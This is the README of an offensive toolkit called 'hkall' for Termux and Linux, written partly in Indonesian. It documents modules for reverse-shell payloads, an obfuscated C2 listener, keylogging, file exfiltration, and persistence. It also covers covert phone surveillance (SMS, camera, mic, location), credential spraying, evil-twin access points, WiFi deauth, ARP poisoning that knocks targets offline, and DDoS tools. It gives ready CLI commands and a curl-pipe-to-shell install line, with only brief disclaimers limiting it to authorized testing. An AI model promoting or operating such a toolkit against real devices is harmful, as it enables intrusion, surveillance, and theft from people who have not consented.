# hkall — Modular Offensive Toolkit

Python 3 stdlib toolkit for Android/Termux + Linux. Authorized security testing only.

## Platform
Jalan di device apa saja yang ada Python 3: **Termux (android)**, Linux (Debian/Ubuntu/Arch/Fedora), WSL,
macOS. Wrapper `bin/hkall` + `bin/hkall-deps` auto-detect package manager. Bukan Termux khusus.

## Target online / device lain
`docs/MANUAL.md` — tata cara rinci semua fitur (tiap modul: prompt, contoh CLI, output).
`docs/USAGE.md` — alur umum.
`docs/ONLINE.md` — alur menarget device lain secara online: same-LAN, reverse-shell (bypass NAT),
port-forwarding (Jalur 3), VPS relay.

## Install
```bash
pkg install -y python git termux-api
git clone https://github.com/rizqiwidi/hkall.git
cd hkall && chmod +x hkall.py && chmod +x bin/hkall
python hkall.py
```
Or: `curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh`

Install tool/library dependency (opsional, sekali):
`sh bin/hkall-deps`  — auto-detect pkg/apt/dnf/pacman/pip/Go, pasang semua tool external.

`install.sh` installs global `hkall` command into PATH (Termux `$PREFIX/bin`,
else `~/bin`). Works from any terminal — Termux, bash, zsh, WSL.

## Global command (works anywhere with Python 3)
```bash
hkall                # TUI menu
hkall --list         # all modules
hkall --search sql   # filter modules by name/key
hkall -m scan -h     # per-module flags help
hkall -m scan --host 192.168.1.5 --ports 1-1000   # one-shot with presets
hkall -m idor --host http://192.168.1.5/api/user/{{id}} --range 20
```

## Shell completion
- bash: `source $HOME/hkall/bin/hkall-completion.bash`  (add to `~/.bashrc`)
- zsh: `source $HOME/hkall/bin/hkall-completion.zsh`  (add to `~/.zshrc`)
- `hkall -m <TAB>` completes module keys.

## TUI navigation
- `/query` — filter module list by text (e.g. `/sql` shows only matches)
- `i N` — show usage info for module N
- `N` — run module N
- `0` / `q` — exit

## TUI — 34 module (builtin + plugin)
```
builtin: scan enum whois subd shell c2 keylog exfil recv
         payload exe2 lan arp wifi persist ops serve spray cfg history
plugin : sqli xss csrf idor mitm netcut deauth sniff eviltwin dnsspoof ddos
         websec toolbox hello
```
> Daftar & nomor selalu berubah seiring plugin; jalankan `hkall --list` untuk yang akurat saat ini.

## CLI one-shot
```bash
python hkall.py --list
python hkall.py -m scan --host 192.168.1.5 --ports 1-1000
python hkall.py -m scan --host x.x.x.x --ports 445,3389 --out scan.txt
python hkall.py -m enum --host http://example.com
python hkall.py -m payload --host 1.2.3.4 --port 8443
python hkall.py -m history
python hkall.py -m cfg
python hkall.py -m c2 --port 4444
python hkall.py -m subd --host example.com
python hkall.py -m lan --cidr 192.168.1.0/24
python hkall.py -m arp --cidr 192.168.1.0/24
python hkall.py -m wifi
python hkall.py -m persist
python hkall.py -m spray --host https://login.example.com
python hkall.py -m sqli --host http://192.168.1.5/sqli.php?x=1
python hkall.py -m xss --host http://192.168.1.5/search.php?q=
python hkall.py -m csrf --host http://192.168.1.5/account/update
python hkall.py -m idor --host http://192.168.1.5/api/user/{{id}}
python hkall.py -m ddos --host http://127.0.0.1:8090/load
python hkall.py -m websec          # orchestrator menu: chain web tests
python hkall.py -m toolbox         # external tools launcher (sqlmap/nmap/ffuf/...)
```

## Module reference

| key | name | what it does |
|-----|------|-------------|
| scan | Port scanner | TCP connect scan, optional banner grab |
| enum | Web enumerator | headers, emails, secrets, form count |
| whois | DNS lookup | A/AAAA records, reverse PTR |
| subd | Subdomain brute | DNS wordlist scan, multi-threaded |
| shell | Shell generator | py/bash/nc/sh/php one-liners |
| c2 | C2 listener | multi-session, XOR stream obfuscation |
| keylog | Keylogger | raw tty capture → `data/keys.log` |
| exfil | Exfil client | send file to `recv` listener |
| recv | Exfil server | receive file from `exfil` client |
| payload | Payload builder | Python reconnect shell (plain or XOR) |
| exe2 | Shell variants | Android termux / Linux one-liners |
| lan | LAN discoverer | probe CIDR 22/80/135/139/443/445/3389 |
| arp | ARP scan | raw socket ARP sweep (root, Linux) |
| wifi | Wifi audit | scaninfo + connectioninfo via termux-api |
| persist | Persistence | boot script + shell hook (opt-in) |
| ops | Device ops | battery, sms, camera, mic, location, vibrate, clipboard |
| serve | HTTP server | static file server on port 8080 |
| spray | Credential spray | wordlist brute-force web login forms |
| cfg | Config profile | set host/port/cidr defaults (persisted) |
| history | History | view sqlite result store `data/rs.db` |
| sqli | SQLi tester | 16 payload classic + time-based blind, status/timing diff |
| xss | XSS reflection | 6 payloads, detects raw reflected vs escaped |
| csrf | CSRF check | SameSite cookie + token presence verdict |
| idor | IDOR enum | object ID sweep, authz check per ID |
| mitm | ARP MITM lab | ARP spoof between two own hosts, auto-restore (root) |
| netcut | Cut internet target | ARP poison gw→dummy, target offline sementara, auto-restore (root) |
| deauth | Deauth/kick WiFi | 802.11 deauth, aireplay-ng or raw frame, monitor iface (root) |
| sniff | Passive capture | HTTP plaintext creds + nearby WiFi probe request (root) |
| eviltwin | Evil twin AP clone | hostapd + dnsmasq, same SSID, DNS wildcard (root) |
| dnsspoof | DNS spoof lab | fake DNS server for lab domain (root) |
| ddos | Load test | bounded concurrency/duration, req/s + byte stats |
| websec | Orchestrator | menu: chain sqli→xss→csrf→idor against one target |
| toolbox | External tools | launcher for sqlmap/nmap/hydra/ffuf/bettercap/dnschef/tcpdump/mitmproxy/hping3/dnsmasq/dsniff/ab/siege/wrk/goldeneye/macchanger/tshark |

### Toolbox (external tools)

`python hkall.py -m toolbox` — menu kategori → pilih tool → binary belum ada? toolbox tawarkan
`pkg install` (konfirmasi dulu, tidak auto) → wrapper interaktif arg → jalan.
Katalog: `tools.json` (18 tool).

Sudah terpasang di device ini: `tshark`, `mitmdump` (mitmproxy). Sisanya ditawarkan install saat dipilih.
Kalau nggak mau install: semua modul internal (sqli, xss, csrf, idor, mitm, dnsspoof, ddos) jalan tanpa dependency.

| kategori | tools |
|----------|-------|
| web | sqlmap, ffuf, mitmproxy |
| net | bettercap, dnschef, tcpdump, tshark, hping3, dnsmasq, dsniff, macchanger |
| recon | nmap |
| auth | hydra |
| load | ab, siege, wrk, goldeneye |

Tidak tersedia di Termux (ditandai `unavailable`): ettercap. Perlu source/pip: dalfox, xsstrike, feroxbuster.
GUI/cloud (tidak cocok Termux CLI): Burp Suite, XSSHunter, evilginx. Windows-only: responder.

## C2 usage
```bash
python hkall.py -m c2 --port 4444
```
Session commands inside listener:
```
sessions          list connected shells
use S1            select session 1
kill S1           drop session
<cmd>             run on selected session
exit              stop listener
```
**Obfuscation**: set `obfuscate: true` in `config.json`, then build payload with `y`. Client and server XOR stream match.
**Auth (PSK)**: listener otomatis pakai shared secret `data/c2.psk` (dibuat sekali, chmod 0600). Koneksi tanpa/salah PSK ditolak. Payload baru (`-m payload`) embed PSK otomatis — payload lama (pra-PSK) tidak bisa konek lagi, build ulang.

## Testing
```bash
python3 tests/test_smoke.py   # 12 smoke test (tanpa framework), exit 1 bila gagal
```

## Robustness guards
- Semua input user (port, IP, MAC, cidr, range, durasi) divalidasi → input salah = pesan singkat + return, bukan traceback.
- `load_cfg` warning stderr bila `config.json` korup (fallback ke default).
- `rs.db` schema mismatch → warning, data tak rusak (hapus `data/rs.db` bila perlu reset).
- `bin/hkall-deps` lapor `[FAIL]`/`[ok]` per tool, jujur bila ada yang gagal terpasang.

## Plugins
Drop `.py` into `modules/`:
```python
def mod_mymod():
    print("hello from plugin")
PLUGIN = {"mymod": ("My module", mod_mymod, True)}
```
Plugins auto-loaded, appear in TUI and CLI. Sample: `modules/hello.py`.

## Data / artifacts
- `lab/lab_server.py` — vulnerable local test server (own device, 127.0.0.1:8090) for sqli/xss/csrf/idor/ddos practice
- `data/rs.db` — sqlite history (kind, target, ts, data)
- `data/keys.log` — keylogger capture
- `data/payload.py` — built payload (embed PSK auth)
- `data/c2.psk` — C2 shared secret (0600, jangan dibagikan)
- `data/cam_*.jpg` — camera capture
- `data/mic_*.m4a` — mic recording
- `wordlist.txt` — password wordlist for spray
- `subd.txt` — subdomain wordlist

## Config
Defaults stored in `config.json`. Edit manually or use `cfg` module:
```json
{"host": "1.2.3.4", "port": "4444", "ports": "1-1000", "cidr": "192.168.1.0/24"}
```

## Legal
Authorized testing only. You own the consequences.